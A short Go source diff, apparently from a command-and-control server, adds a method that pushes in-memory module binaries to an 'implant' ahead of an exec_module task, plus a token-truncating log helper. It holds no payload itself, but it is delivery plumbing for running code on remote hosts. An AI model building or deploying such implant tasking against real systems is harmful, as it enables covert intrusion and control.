@@ -1206,3 +1206,36 @@ func (l *TCPListener) decryptTunnel(frame []byte) []byte {
 	}
 	return pt
 }
+
+// ─── 内存模块二进制下发（v1.4.0 S4）───────────────────────────────────────────
+
+// PushModuleBlob 把模块二进制作为一帧 TypeModuleData 下发（TCP 通道）。
+// wait=true：模块帧必须先于随后的 exec_module 任务到达（任务里只有 token），
+// queuePacket 的 FIFO 顺序保证植入端先拿到字节再执行任务（植入端另有等待兜底）。
+func (l *TCPListener) PushModuleBlob(sessionID, token string, payload []byte) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("empty module blob")
+	}
+	packet := &protocol.Packet{
+		Magic:     [4]byte{'T', 'S', 'H', 'L'},
+		Version:   protocol.Version,
+		Type:      protocol.TypeModuleData,
+		Timestamp: uint64(time.Now().UnixMilli()),
+		Payload:   payload,
+	}
+	if err := l.queuePacket(sessionID, packet, true); err != nil {
+		l.sessionMgr.ClearConnection(sessionID)
+		return fmt.Errorf("failed to push module blob: %w", err)
+	}
+	logging.Info("listener", "module blob pushed to session %s (token=%s size=%d)", sessionID, shortToken(token), len(payload))
+	return nil
+}
+
+// shortToken 日志里只留 token 前 8 位：token 是**一次性凭据**，虽然它被用掉后即失效，
+// 但日志/截图/工单里出现完整凭据是不必要的暴露面（审计只需要能关联到同一次下发）。
+func shortToken(tok string) string {
+	if len(tok) <= 8 {
+		return tok
+	}
+	return tok[:8]
+}
